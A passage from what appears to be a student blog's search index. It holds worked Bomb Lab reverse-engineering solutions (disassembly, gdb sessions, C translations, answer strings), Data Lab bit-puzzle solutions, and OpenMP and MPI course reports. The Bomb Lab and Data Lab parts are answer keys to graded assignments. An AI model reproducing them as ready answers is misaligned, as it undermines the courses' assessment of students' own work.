稳妥的做法是令 0 &lt;= y - 2 &lt;= 2, 不妨取 y = 2.(gdb) disassembleDump of assembler code for function phase_4: 0x00000000004015a9 &lt;+0&gt;: sub $0x18,%rsp 0x00000000004015ad &lt;+4&gt;: lea 0x8(%rsp),%rcx 0x00000000004015b2 &lt;+9&gt;: lea 0xc(%rsp),%rdx 0x00000000004015b7 &lt;+14&gt;: lea 0x1e77(%rip),%rsi # 0x403435 0x00000000004015be &lt;+21&gt;: mov $0x0,%eax 0x00000000004015c3 &lt;+26&gt;: callq 0x401130 &lt;__isoc99_sscanf@plt&gt; 0x00000000004015c8 &lt;+31&gt;: cmp $0x2,%eax 0x00000000004015cb &lt;+34&gt;: jne 0x4015d9 &lt;phase_4+48&gt; 0x00000000004015cd &lt;+36&gt;: mov 0x8(%rsp),%eax 0x00000000004015d1 &lt;+40&gt;: sub $0x2,%eax 0x00000000004015d4 &lt;+43&gt;: cmp $0x2,%eax 0x00000000004015d7 &lt;+46&gt;: jbe 0x4015de &lt;phase_4+53&gt; 0x00000000004015d9 &lt;+48&gt;: callq 0x401b5c &lt;explode_bomb&gt; 0x00000000004015de &lt;+53&gt;: mov 0x8(%rsp),%esi 0x00000000004015e2 &lt;+57&gt;: mov $0x9,%edi 0x00000000004015e7 &lt;+62&gt;: callq 0x401571 &lt;func4&gt;=&gt; 0x00000000004015ec &lt;+67&gt;: cmp 0xc(%rsp),%eax 0x00000000004015f0 &lt;+71&gt;: je 0x4015f7 &lt;phase_4+78&gt; 0x00000000004015f2 &lt;+73&gt;: callq 0x401b5c &lt;explode_bomb&gt; 0x00000000004015f7 &lt;+78&gt;: add $0x18,%rsp 0x00000000004015fb &lt;+82&gt;: retqEnd of assembler dump.(gdb) info registers eaxeax 0xb0 176Solution176 2" }, { "title": "Bomb Lab: Phase 3", "url": "/course-work/computer-organization-and-architecture/2022/04/04/phase_3/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly00000000004014b1 &lt;phase_3&gt;:b0: 4014b1:\t48 83 ec 18 \tsub $0x18,%rsp 4014b5:\t48 8d 4c 24 0c \tlea 0xc(%rsp),%rcx 4014ba:\t48 8d 54 24 08 \tlea 0x8(%rsp),%rdx 4014bf:\t48 8d 35 6f 1f 00 00 \tlea 0x1f6f(%rip),%rsi # 403435 &lt;array.3354+0x255&gt; 4014c6:\tb8 00 00 00 00 \tmov $0x0,%eax 4014cb:\te8 60 fc ff ff \tcallq 401130 &lt;__isoc99_sscanf@plt&gt; 4014d0:\t83 f8 01 \tcmp $0x1,%eax 4014d3:\t7f 05 \tjg 4014da &lt;phase_3+0x29&gt; 4014d5:\te8 82 06 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b1: 4014da:\t83 7c 24 08 07 \tcmpl $0x7,0x8(%rsp) 4014df:\t77 6f \tja 401550 &lt;phase_3+0x9f&gt; 4014e1:\t8b 54 24 08 \tmov 0x8(%rsp),%edx 4014e5:\t48 8d 05 d4 1c 00 00 \tlea 0x1cd4(%rip),%rax # 4031c0 &lt;_IO_stdin_used+0x1c0&gt; 4014ec:\t48 63 14 90 \tmovslq (%rax,%rdx,4),%rdx 4014f0:\t48 01 d0 \tadd %rdx,%rax 4014f3:\tff e0 \tjmpq *%rax 4014f5:\tb8 00 00 00 00 \tmov $0x0,%eax 4014fa:\teb 05 \tjmp 401501 &lt;phase_3+0x50&gt; 4014fc:\tb8 cb 02 00 00 \tmov $0x2cb,%eaxb2: 401501:\t2d 4c 02 00 00 \tsub $0x24c,%eax 401506:\teb 05 \tjmp 40150d &lt;phase_3+0x5c&gt; 401508:\tb8 00 00 00 00 \tmov $0x0,%eaxb3: 40150d:\t05 ba 03 00 00 \tadd $0x3ba,%eax 401512:\teb 05 \tjmp 401519 &lt;phase_3+0x68&gt; 401514:\tb8 00 00 00 00 \tmov $0x0,%eaxb4: 401519:\t2d 79 03 00 00 \tsub $0x379,%eax 40151e:\teb 05 \tjmp 401525 &lt;phase_3+0x74&gt; 401520:\tb8 00 00 00 00 \tmov $0x0,%eaxb5: 401525:\t05 79 03 00 00 \tadd $0x379,%eax 40152a:\teb 05 \tjmp 401531 &lt;phase_3+0x80&gt; 40152c:\tb8 00 00 00 00 \tmov $0x0,%eaxb6: 401531:\t2d 79 03 00 00 \tsub $0x379,%eax 401536:\teb 05 \tjmp 40153d &lt;phase_3+0x8c&gt; 401538:\tb8 00 00 00 00 \tmov $0x0,%eaxb7: 40153d:\t05 79 03 00 00 \tadd $0x379,%eax 401542:\teb 05 \tjmp 401549 &lt;phase_3+0x98&gt; 401544:\tb8 00 00 00 00 \tmov $0x0,%eaxb8: 401549:\t2d 79 03 00 00 \tsub $0x379,%eax 40154e:\teb 0a \tjmp 40155a &lt;phase_3+0xa9&gt;b9: 401550:\te8 07 06 00 00 \tcallq 401b5c &lt;explode_bomb&gt; 401555:\tb8 00 00 00 00 \tmov $0x0,%eaxb10: 40155a:\t83 7c 24 08 05 \tcmpl $0x5,0x8(%rsp) 40155f:\t7f 06 \tjg 401567 &lt;phase_3+0xb6&gt; 401561:\t3b 44 24 0c \tcmp 0xc(%rsp),%eax 401565:\t74 05 \tje 40156c &lt;phase_3+0xbb&gt;b11: 401567:\te8 f0 05 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b12: 40156c:\t48 83 c4 18 \tadd $0x18,%rsp 401570:\tc3 \tretq翻译为 Cvoid phase_3(char* rdi) {b0: int rsp[6]; int* rcx = rsp + 3; int* rdx = rsp + 2; char* rsi = 0x403435; // 403435 &lt;array.3354+0x255&gt; int rax = 0; // 32-bit rax = __isoc99_sscanf(rdi, rsi, rdx, rcx); if (rax &gt; 1) // 32-bit goto b1; explode_bomb();b1: if (rsp[2] &gt; 7) goto b9; int rdx = rsp[2]; // 32-bit int* rax = 0x4031c0; // 4031c0 &lt;_IO_stdin_used+0x1c0&gt; rdx = rax[rdx]; rax += rdx; jmpq(rax); rax = 0; // 32-bit goto b2; rax = 0x2cb; // 32-bitb2: rax -= 0x24c; // 32-bit goto b3; rax = 0; // 32-bitb3: rax += 0x3ba; // 32-bit goto b4; rax = 0; // 32-bitb4: rax -= 0x379; // 32-bit goto b5; rax = 0; // 32-bitb5: rax += 0x379; // 32-bit goto b6; rax = 0; // 32-bitb6: rax -= 0x379; // 32-bit goto b7; rax = 0; // 32-bitb7: rax += 0x379; // 32-bit goto b8; rax = 0; // 32-bitb8: rax -= 0x379; // 32-bit goto b10;b9: explode_bomb(); rax = 0; // 32-bitb10: if (rsp[2] &gt; 5) goto b11; if (rax == rsp[3]) // 32-bit goto b12;b11: explode_bomb();b12: return;}Hack(gdb) x/s 0x4034350x403435: \"%d %d\"(gdb) x/8xw 0x4031c00x4031c0: 0xffffe33c 0xffffe335 0xffffe348 0xffffe3540x4031d0: 0xffffe360 0xffffe36c 0xffffe378 0xffffe384 i *(0x4031c0 + i * sizeof(int)) 0x4031c0 + *(0x4031c0 + i * sizeof(int)) BasicBlock 0 0xffffe33c 0x004014fc bb0 1 0xffffe335 0x004014f5 bb1 2 0xffffe348 0x00401508 bb2 3 0xffffe354 0x00401514 bb3 4 0xffffe360 0x00401520 bb4 5 0xffffe36c 0x0040152c bb5 6 0xffffe378 0x00401538 bb6 7 0xffffe384 0x00401544 bb7 重新分割 BasicBlock00000000004014b1 &lt;phase_3&gt;:b0: 4014b1:\t48 83 ec 18 \tsub $0x18,%rsp 4014b5:\t48 8d 4c 24 0c \tlea 0xc(%rsp),%rcx 4014ba:\t48 8d 54 24 08 \tlea 0x8(%rsp),%rdx 4014bf:\t48 8d 35 6f 1f 00 00 \tlea 0x1f6f(%rip),%rsi # 403435 &lt;array.3354+0x255&gt; 4014c6:\tb8 00 00 00 00 \tmov $0x0,%eax 4014cb:\te8 60 fc ff ff \tcallq 401130 &lt;__isoc99_sscanf@plt&gt; 4014d0:\t83 f8 01 \tcmp $0x1,%eax 4014d3:\t7f 05 \tjg 4014da &lt;phase_3+0x29&gt; 4014d5:\te8 82 06 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b1: 4014da:\t83 7c 24 08 07 \tcmpl $0x7,0x8(%rsp) 4014df:\t77 6f \tja 401550 &lt;phase_3+0x9f&gt; 4014e1:\t8b 54 24 08 \tmov 0x8(%rsp),%edx 4014e5:\t48 8d 05 d4 1c 00 00 \tlea 0x1cd4(%rip),%rax # 4031c0 &lt;_IO_stdin_used+0x1c0&gt; 4014ec:\t48 63 14 90 \tmovslq (%rax,%rdx,4),%rdx 4014f0:\t48 01 d0 \tadd %rdx,%rax 4014f3:\tff e0 \tjmpq *%raxbb1: 4014f5:\tb8 00 00 00 00 \tmov $0x0,%eax 4014fa:\teb 05 \tjmp 401501 &lt;phase_3+0x50&gt;bb0: 4014fc:\tb8 cb 02 00 00 \tmov $0x2cb,%eaxb2: 401501:\t2d 4c 02 00 00 \tsub $0x24c,%eax 401506:\teb 05 \tjmp 40150d &lt;phase_3+0x5c&gt;bb2: 401508:\tb8 00 00 00 00 \tmov $0x0,%eaxb3: 40150d:\t05 ba 03 00 00 \tadd $0x3ba,%eax 401512:\teb 05 \tjmp 401519 &lt;phase_3+0x68&gt;bb3: 401514:\tb8 00 00 00 00 \tmov $0x0,%eaxb4: 401519:\t2d 79 03 00 00 \tsub $0x379,%eax 40151e:\teb 05 \tjmp 401525 &lt;phase_3+0x74&gt;bb4: 401520:\tb8 00 00 00 00 \tmov $0x0,%eaxb5: 401525:\t05 79 03 00 00 \tadd $0x379,%eax 40152a:\teb 05 \tjmp 401531 &lt;phase_3+0x80&gt;bb5: 40152c:\tb8 00 00 00 00 \tmov $0x0,%eaxb6: 401531:\t2d 79 03 00 00 \tsub $0x379,%eax 401536:\teb 05 \tjmp 40153d &lt;phase_3+0x8c&gt;bb6: 401538:\tb8 00 00 00 00 \tmov $0x0,%eaxb7: 40153d:\t05 79 03 00 00 \tadd $0x379,%eax 401542:\teb 05 \tjmp 401549 &lt;phase_3+0x98&gt;bb7: 401544:\tb8 00 00 00 00 \tmov $0x0,%eaxb8: 401549:\t2d 79 03 00 00 \tsub $0x379,%eax 40154e:\teb 0a \tjmp 40155a &lt;phase_3+0xa9&gt;b9: 401550:\te8 07 06 00 00 \tcallq 401b5c &lt;explode_bomb&gt; 401555:\tb8 00 00 00 00 \tmov $0x0,%eaxb10: 40155a:\t83 7c 24 08 05 \tcmpl $0x5,0x8(%rsp) 40155f:\t7f 06 \tjg 401567 &lt;phase_3+0xb6&gt; 401561:\t3b 44 24 0c \tcmp 0xc(%rsp),%eax 401565:\t74 05 \tje 40156c &lt;phase_3+0xbb&gt;b11: 401567:\te8 f0 05 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b12: 40156c:\t48 83 c4 18 \tadd $0x18,%rsp 401570:\tc3 \tretq重新翻译为 Cvoid phase_3(char* rdi) {b0: int rsp[6]; int rax = 0; // 32-bit rax = __isoc99_sscanf(rdi, \"%d %d\", rsp + 2, rsp + 3); if (rax &gt; 1) // 32-bit goto b1; explode_bomb();b1: if (rsp[2] &gt; 7) goto b9; int rdx = rsp[2]; // 32-bit int* rax = 0x4031c0; // 4031c0 &lt;_IO_stdin_used+0x1c0&gt; rdx = rax[rdx]; rax += rdx; jmpq(rax);bb1: rax = 0; // 32-bit goto b2;bb0: rax = 0x2cb; // 32-bitb2: rax -= 0x24c; // 32-bit goto b3;bb2: rax = 0; // 32-bitb3: rax += 0x3ba; // 32-bit goto b4;bb3: rax = 0; // 32-bitb4: rax -= 0x379; // 32-bit goto b5;bb4: rax = 0; // 32-bitb5: rax += 0x379; // 32-bit goto b6;bb5: rax = 0; // 32-bitb6: rax -= 0x379; // 32-bit goto b7;bb6: rax = 0; // 32-bitb7: rax += 0x379; // 32-bit goto b8;bb7: rax = 0; // 32-bitb8: rax -= 0x379; // 32-bit goto b10;b9: explode_bomb(); rax = 0; // 32-bitb10: if (rsp[2] &gt; 5) goto b11; if (rax == rsp[3]) // 32-bit goto b12;b11: explode_bomb();b12: return;}Reverse analysis逆向推导. 整个函数只有一处 return 位于 b12 中, 因此必须寻找到一条不会引发 explode_bomb() 的路径. 由于 b11 必然触发 explode_bomb(), 因此不能经过 b11, 而应通过 jmp 绕过 b11 到达 b12. 可通过 jmp 到达 b12 的 BasicBlock 有且仅有 b10, 且必须满足 (rsp[2] &lt;= 5) &amp;&amp; (rax == rsp[3]). 这意味着, 只有 bb0, bb1, bb2, bb3, bb4, bb5 是可以通过 jmpq *%rax 安全到达.删去无效的跳转点翻译为 Cvoid phase_3(char* rdi) {b0: int rsp[6]; int rax = 0; // 32-bit rax = __isoc99_sscanf(rdi, \"%d %d\", rsp + 2, rsp + 3); if (rax &gt; 1) // 32-bit goto b1; explode_bomb();b1: if (rsp[2] &gt; 7) goto b9; int rdx = rsp[2]; // 32-bit int* rax = 0x4031c0; // 4031c0 &lt;_IO_stdin_used+0x1c0&gt; rdx = rax[rdx]; rax += rdx; jmpq(rax);bb1: rax = 0; // 32-bit goto b2;bb0: rax = 0x2cb; // 32-bitb2: rax -= 0x24c; // 32-bit goto b3;bb2: rax = 0; // 32-bitb3: rax += 0x3ba; // 32-bit goto b4;bb3: rax = 0; // 32-bitb4: rax -= 0x379; // 32-bit goto b5;bb4: rax = 0; // 32-bitb5: rax += 0x379; // 32-bit goto b6;bb5: rax = 0; // 32-bitb6: rax -= 0x379; // 32-bit goto b7; rax = 0; // 32-bitb7: rax += 0x379; // 32-bit goto b8; rax = 0; // 32-bitb8: rax -= 0x379; // 32-bit goto b10;b9: explode_bomb(); rax = 0; // 32-bitb10: if (rsp[2] &gt; 5) goto b11; if (rax == rsp[3]) // 32-bit goto b12;b11: explode_bomb();b12: return;}跳转图去除必然触发 explode_bomb 的 BasicBlock, 可得如下跳转图:stateDiagram-v2 state \"bb1 rax = 0\" as bb1 state \"bb0 rax = 0x2cb\" as bb0 state \"b2 rax -= 0x24c\" as b2 state \"bb2 rax = 0\" as bb2 state \"b3 rax += 0x3ba\" as b3 state \"bb3 rax = 0\" as bb3 state \"b4 rax -= 0x379\" as b4 state \"bb4 rax = 0\" as bb4 state \"b5 rax += 0x379\" as b5 state \"bb5 rax = 0\" as bb5 state \"b6 rax -= 0x379\" as b6 state \"b7 rax += 0x379\" as b7 state \"b8 rax -= 0x379\" as b8 b0 --&gt; b1 b1 --&gt; bb0: rsp[2] == 0 b1 --&gt; bb1: rsp[2] == 1 b1 --&gt; bb2: rsp[2] == 2 b1 --&gt; bb3: rsp[2] == 3 b1 --&gt; bb4: rsp[2] == 4 b1 --&gt; bb5: rsp[2] == 5 bb1 --&gt; b2 bb0 --&gt; b2 b2 --&gt; b3 bb2 --&gt; b3 b3 --&gt; b4 bb3 --&gt; b4 b4 --&gt; b5 bb4 --&gt; b5 b5 --&gt; b6 bb5 --&gt; b6 b6 --&gt; b7 b7 --&gt; b8 b8 --&gt; b10 b10 --&gt; b12Solution稍加分析不难发现, 沿着 b0 --&gt; b1 --&gt; bb4 --&gt; b5 --&gt; b6 --&gt; b7 --&gt; b8 --&gt; b10 恰好能够得到 %rax == 0.4 0" }, { "title": "Bomb Lab: Phase 2", "url": "/course-work/computer-organization-and-architecture/2022/04/04/phase_2/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly000000000040145e &lt;phase_2&gt;:b0: 40145e:\t55 \tpush %rbp 40145f:\t53 \tpush %rbx 401460:\t48 83 ec 28 \tsub $0x28,%rsp 401464:\t48 89 e6 \tmov %rsp,%rsi 401467:\te8 2c 07 00 00 \tcallq 401b98 &lt;read_six_numbers&gt; 40146c:\t83 3c 24 00 \tcmpl $0x0,(%rsp) 401470:\t75 07 \tjne 401479 &lt;phase_2+0x1b&gt; 401472:\t83 7c 24 04 01 \tcmpl $0x1,0x4(%rsp) 401477:\t74 23 \tje 40149c &lt;phase_2+0x3e&gt;b1: 401479:\te8 de 06 00 00 \tcallq 401b5c &lt;explode_bomb&gt; 40147e:\t66 90 \txchg %ax,%ax 401480:\teb 1a \tjmp 40149c &lt;phase_2+0x3e&gt;b2: 401482:\t8b 43 f8 \tmov -0x8(%rbx),%eax 401485:\t03 43 fc \tadd -0x4(%rbx),%eax 401488:\t39 03 \tcmp %eax,(%rbx) 40148a:\t74 05 \tje 401491 &lt;phase_2+0x33&gt; 40148c:\te8 cb 06 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b3: 401491:\t48 83 c3 04 \tadd $0x4,%rbx 401495:\t48 39 eb \tcmp %rbp,%rbx 401498:\t75 e8 \tjne 401482 &lt;phase_2+0x24&gt; 40149a:\teb 0e \tjmp 4014aa &lt;phase_2+0x4c&gt;b4: 40149c:\t48 89 e5 \tmov %rsp,%rbp 40149f:\t48 8d 5c 24 08 \tlea 0x8(%rsp),%rbx 4014a4:\t48 83 c5 18 \tadd $0x18,%rbp 4014a8:\teb d8 \tjmp 401482 &lt;phase_2+0x24&gt;b5: 4014aa:\t48 83 c4 28 \tadd $0x28,%rsp 4014ae:\t5b \tpop %rbx 4014af:\t5d \tpop %rbp 4014b0:\tc3 \tretq翻译为 Cvoid phase_2() {b0: // push rbp rbx rsp -= 0x28; rsi = rsp; rax = read_six_numbers(); if (*rsp) goto b1; if (*(rsp + 0x4) == 1) goto b4;b1: explode_bomb(); nop(); goto b4;b2: rax = *(rbx - 0x8); // 32-bit rax += *(rbx - 0x4); // 32-bit if (*rbx == rax) // 32-bit goto b3; explode_bomb();b3: rbx += 0x4; if (rbx != rbp) goto b2; goto b5;b4: rbp = rsp; rbx = rsp + 0x8; rbp += 0x18; goto b2;b5: rsp += 0x28; // pop rbx rbp return;}Optimizevoid phase_2(char* rdi) { int rsp[10]; read_six_numbers(rdi, rsp); if (rsp[0] != 0 || rsp[1] != 1) explode_bomb(); for (int* rbx = rsp + 2; rbx != rsp + 6; ++rbx) { if (rbx[0] != rbx[-1] + rbx[-2]) explode_bomb(); }}Solution 0 1 0 + 1 = 1 1 + 1 = 2 1 + 2 = 3 2 + 3 = 50 1 1 2 3 5" }, { "title": "Bomb Lab: Phase 1", "url": "/course-work/computer-organization-and-architecture/2022/04/04/phase_1/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "Assembly0000000000401440 &lt;phase_1&gt;:b0: 401440:\t48 83 ec 08 \tsub $0x8,%rsp 401444:\t48 8d 35 05 1d 00 00 \tlea 0x1d05(%rip),%rsi # 403150 &lt;_IO_stdin_used+0x150&gt; 40144b:\te8 43 04 00 00 \tcallq 401893 &lt;strings_not_equal&gt; 401450:\t85 c0 \ttest %eax,%eax 401452:\t74 05 \tje 401459 &lt;phase_1+0x19&gt; 401454:\te8 03 07 00 00 \tcallq 401b5c &lt;explode_bomb&gt;b1: 401459:\t48 83 c4 08 \tadd $0x8,%rsp 40145d:\tc3 \tretq翻译为 Cvoid phase_1() {b0: rsp -= 8; rsi = rip + 0x1d05; rax = strings_not_equal(rdi, rsi); if (rax == 0) // 32-bit goto b1; explode_bomb();b1: rsp += 8; return;}Optimizevoid phase_1(char* rdi) { char* rsi = 0x403150; // 403150 &lt;_IO_stdin_used+0x150&gt; if (strings_not_equal(rdi, rsi)) explode_bomb(); return;}Hack(gdb) x/s 0x4031500x403150: \"I am not part of the problem. I am a Republican.\"SolutionI am not part of the problem. I am a Republican." }, { "title": "Bomb Lab", "url": "/course-work/computer-organization-and-architecture/2022/04/04/bomb-lab/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": "2022-04-04 00:00:00 +0800", "snippet": "详见该目录下的各个文件." }, { "title": "exp3: 测量 OpenMP 并行 for 循环不同调度策略的性能", "url": "/course-work/introduction-to-high-performance-computing/2022/03/28/exp3-%E6%B5%8B%E9%87%8F-openmp-%E5%B9%B6%E8%A1%8C-for-%E5%BE%AA%E7%8E%AF%E4%B8%8D%E5%90%8C%E8%B0%83%E5%BA%A6%E7%AD%96%E7%95%A5%E7%9A%84%E6%80%A7%E8%83%BD/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, OMP", "date": "2022-03-28 00:00:00 +0800", "snippet": " 调度策略 static dynamic guided Sort uniform parts 70.4433 ms 94.0649 ms 69.919 ms Sort random parts 1436.51 ms 1376.06 ms 1443.13 ms Sort Uniform Parts由于每个 part 的长度相同, 每次迭代的开销基本均衡. nUniformParts = 100000, 总迭代次数较 多.因此, 分配过程耗时较长的 dynamic 调度开销显著高于 static 和 guided.考虑到每次迭代的开销波动, 使用 static 调度的负载并不完全均衡. 而使用 guided 调度能够通过 引入较小的开销优化由于波动产生的负载不均.Sort Random Parts每个 part 的长度较为不均, 每次迭代的开销极不均衡. nRandomParts = 100, 总迭代次数较 少.因此, 使用 static 和 guided 将导致负载的极不均衡. 而 dynamic 虽然引入了分配开销, 但总迭代次数少, 负载均衡带来的收益 能够弥补 分配 带来的额外开销." }, { "title": "exp2: MPI Allreduce", "url": "/course-work/introduction-to-high-performance-computing/2022/03/21/exp2-mpi-allreduce/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, MPI", "date": "2022-03-21 00:00:00 +0800", "snippet": "Ring Allreduce 算法首先将每个结点的数据分为 comm_sz 个数据块, 每个数据块大小为 count = n / comm_sz 个 float.第一阶段共 comm_sz - 1 步. 在第 k 步, 第 my_rank 个进程会将自己的第 (my_rank - k) % comm_sz 对应数据块发送给第 succ = my_rank + 1 个进程并累加. 注意到对于 my_rank 进程, 第 k 步的 Send 与 Recv 使用的数据块不同, 但第 k + 1 步的 Send 依赖于第 k 步的 Recv 得到的数据块. 因此 Send 可以是非阻塞的, 但 Recv 必须是阻塞的, 以确保在第 k + 1 步 Send 前, 第 k 步 Recv 已完成.第二阶段共 comm_sz - 1 步. 在第 k 步, 第 my_rank 个进程会将自己的第 (my_rank + 1 - k) % comm_sz 对应数据块发送给第 succ = my_rand + 1 个进程. 与第一阶段同理, Send 可以是非阻塞的, 但 Recv 必须是阻塞的, 以确保在第 k + 1 步 Send 前, 第 k 步 Recv 已完成.void Ring_Allreduce(void* sendbuf, void* recvbuf, int n, MPI_Comm comm, int comm_sz, int my_rank) { int count = n / comm_sz; int succ = (my_rank + 1) % comm_sz; int pred = (my_rank - 1 + comm_sz) % comm_sz; float* send_buf_begin = static_cast&lt;float*&gt;(sendbuf); float* recv_buf_begin = static_cast&lt;float*&gt;(recvbuf); memcpy(recv_buf_begin, send_buf_begin, n * sizeof(float)); MPI_Request req[comm_sz - 1]; for (int k = 0; k &lt; comm_sz - 1; ++k) { MPI_Isend(recv_buf_begin + (((my_rank - k + comm_sz) % comm_sz) * count), count, MPI_FLOAT, succ, k, comm, req + k); float* begin = recv_buf_begin + (((pred - k + comm_sz) % comm_sz) * count); MPI_Recv(begin, count, MPI_FLOAT, pred, k, comm, nullptr); for (float* iter = begin; iter &lt; begin + count; ++iter) (*iter) += *(send_buf_begin + (iter - recv_buf_begin)); } MPI_Waitall(comm_sz - 1, req, nullptr); for (int k = 0; k &lt; comm_sz - 1; ++k) { MPI_Isend( recv_buf_begin + (((my_rank + 1 - k + comm_sz) % comm_sz) * count), count, MPI_FLOAT, succ, k, comm, req + k); MPI_Recv(recv_buf_begin + (((my_rank - k + comm_sz) % comm_sz) * count), count, MPI_FLOAT, pred, k, comm, nullptr); } MPI_Waitall(comm_sz - 1, req, nullptr);}通信时间 Method Comm_size n Time MPI_Allreduce 4 100000000 3195.49 ms Naive_Allreduce 4 100000000 4526.87 ms Ring_Allreduce 4 100000000 1873.94 ms " }, { "title": "Data Lab: Manipulating Bits", "url": "/course-work/computer-organization-and-architecture/2022/03/20/data-lab/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Data Lab", "date": "2022-03-20 00:00:00 +0800", "snippet": "ResultsCorrectness Results Perf ResultsPoints Rating Errors Points Ops Puzzle1 1 0 2 4 bitOr2 2 0 2 3 getByte3 3 0 2 6 logicalShift4 4 0 2 40 bitReverse4 4 0 2 6 bang1 1 0 2 2 tmax2 2 0 2 7 fitsBits2 2 0 2 7 dividePower22 2 0 2 2 negate2 2 0 2 5 isPositive3 3 0 2 14 isLessOrEqual4 4 0 2 27 intLog22 2 0 2 16 floatIsEqual4 4 0 2 14 floatFloat2Int4 4 0 2 11 floatScale2Score = 70/70 [40/40 Corr + 30/30 Perf] (164 total operators)ReportbitOrThinkingDe Morgan's LawSolutionint bitOr(int x, int y) { return ~((~x) &amp; (~y)); }getByteThinking(x &gt;&gt; (n * 8)) &amp; 0b11111111= (x &gt;&gt; (n &lt;&lt; 3)) &amp; 0xffSolutionint getByte(int x, int n) { // return (x &gt;&gt; (n * 8)) &amp; 0b11111111; return (x &gt;&gt; (n &lt;&lt; 3)) &amp; 0xff;}logicalShiftThinkingAfter logical shift to the right by n, the highest 32 - n bits should be 0. Therefore, let ~(((1 &lt;&lt; 31) &gt;&gt; n) &lt;&lt; 1) (an integer containing 32 - n 0s and n 1s) to be the mask.Solutionint logicalShift(int x, int n) { return (x &gt;&gt; n) &amp; (~(((1 &lt;&lt; 31) &gt;&gt; n) &lt;&lt; 1)); }bitReverseThinking// swap odd and even bitsx = ((x &gt;&gt; 1) &amp; 0x55555555) | ((x &amp; 0x55555555) &lt;&lt; 1);// swap consecutive pairsx = ((x &gt;&gt; 2) &amp; 0x33333333) | ((x &amp; 0x33333333) &lt;&lt; 2);// swap 4-bit long pairsx = ((x &gt;&gt; 4) &amp; 0x0F0F0F0F) | ((x &amp; 0x0F0F0F0F) &lt;&lt; 4);// swap bytesx = ((x &gt;&gt; 8) &amp; 0x00FF00FF) | ((x &amp; 0x00FF00FF) &lt;&lt; 8);// swap 2-byte long pairsx = (x &gt;&gt; 16) | (x &lt;&lt; 16);Note that when a negative number is shifted to the right, the high-order bit is filled with 1, so an additional mask16 needs to be added to erase the high-order 1.Solutionint bitReverse(int x) { int mask1, mask2, mask4, mask8, mask16; mask1 = 0x55; // 0b01010101 mask1 |= mask1 &lt;&lt; 8; mask1 |= mask1 &lt;&lt; 16; // swap odd and even bits x = ((x &gt;&gt; 1) &amp; mask1) | ((x &amp; mask1) &lt;&lt; 1); mask2 = 0x33; // 0b00110011 mask2 |= mask2 &lt;&lt; 8; mask2 |= mask2 &lt;&lt; 16; // swap consecutive pairs x = ((x &gt;&gt; 2) &amp; mask2) | ((x &amp; mask2) &lt;&lt; 2); mask4 = 0x0f; // 0b00001111 mask4 |= mask4 &lt;&lt; 8; mask4 |= mask4 &lt;&lt; 16; // swap 8-bit long pairs x = ((x &gt;&gt; 4) &amp; mask4) | ((x &amp; mask4) &lt;&lt; 4); mask8 = 0x00ff; // 0b0000000011111111 mask8 |= mask8 &lt;&lt; 16; // swap bytes x = ((x &gt;&gt; 8) &amp; mask8) | ((x &amp; mask8) &lt;&lt; 8); mask16 = 0xff | (0xff &lt;&lt; 8); // swap 2-byte long pairs x = ((x &gt;&gt; 16) &amp; mask16) | (x &lt;&lt; 16); return x;}bangThinkingWe only need to distinguish 0 and others. Since 0 == -0, or in other words, the sign bit of 0 does not change due to negation. It can be seen from this that if the sign bits of x and -x are both 0, then x must be 0. In addition, -x can be obtained by (~x) + 1.Solutionint bang(int x) { return ((~(x | ((~x) + 1))) &gt;&gt; 31) &amp; 1; }tmaxThinkingtmax is one 0 followed by 31 1s .Solutionint tmax(void) { return ~(1 &lt;&lt; 31); }fitsBitsThinkingWhen x is positive, if all bits in x &gt;&gt; (n - 1) equal 0, then n bits can represent x, vice versa. When x is negative, if all bits in ~ (x &gt;&gt; (n - 1)) equal 0, then n bits can represent x.Solutionint fitsBits(int x, int n) { // x = x &gt;&gt; (n - 1); x = x &gt;&gt; (n + (~0)); return (!x) | (!(~x));}dividePower2ThinkingWhen x is positive, x &gt;&gt; n is the final result. When x is negative, using x + ((1 &lt;&lt; n) - 1) to shift to the right for rounding toward zero.Solutionint dividePower2(int x, int n) { // if (x &gt;&gt; 31) { // // negative // x += (1 &lt;&lt; n) - 1; // } // return x &gt;&gt; n; // x += (x &gt;&gt; 31) &amp; ((1 &lt;&lt; n) - 1); // return x &gt;&gt; n; x += ((x &gt;&gt; 31) &amp; ((1 &lt;&lt; n) + (~0))); return x &gt;&gt; n;}negateSolutionint negate(int x) { return (~x) + 1; }isPositiveThinking(x &gt; 0)= (x &gt;= 0) &amp;&amp; (x != 0)= (sign bit of x is 0) and (x is not 0)Solutionint isPositive(int x) { return (!(x &gt;&gt; 31)) &amp; (!!x); }isLessOrEqualThinkingwhen x and y have the same sign, (x &lt;= y) == (y - x &gt;= 0). When x and y have different signs, y - x may cause overflow. if x is negative, the y must be positive, therefore x &lt;= y.Solutionint isLessOrEqual(int x, int y) { int x_sign = x &gt;&gt; 31; int y_sign = y &gt;&gt; 31; int sign_diff = x_sign ^ y_sign; int y_minus_x = y + ((~x) + 1); int y_less_x = (sign_diff &amp; (y_sign &amp; (!x_sign))) | ((!sign_diff) &amp; (y_minus_x &gt;&gt; 31)); return !y_less_x;}intLog2ThinkingUse dichotomy. First divide x into 16 by 16, using !!(x &gt;&gt; 16) to see whether there exists 1 in the first 16 bits. Then recursively, divide x into 8 by 8 to see whether the 1 reside in the second eight block from the right by !!(x &gt;&gt; 8). Then, divide into 4, 2, 1.Solutionint intLog2(int x) { int ans = (!!(x &gt;&gt; 16)) &lt;&lt; 4; ans = ans | ((!!(x &gt;&gt; (8 + ans))) &lt;&lt; 3); ans = ans | ((!!(x &gt;&gt; (4 + ans))) &lt;&lt; 2); ans = ans | ((!!(x &gt;&gt; (2 + ans))) &lt;&lt; 1); ans = ans | (!!(x &gt;&gt; (1 + ans))); return ans;}floatIsEqualThinking If either argument is NaN, return 0. +0 and -0 are considered 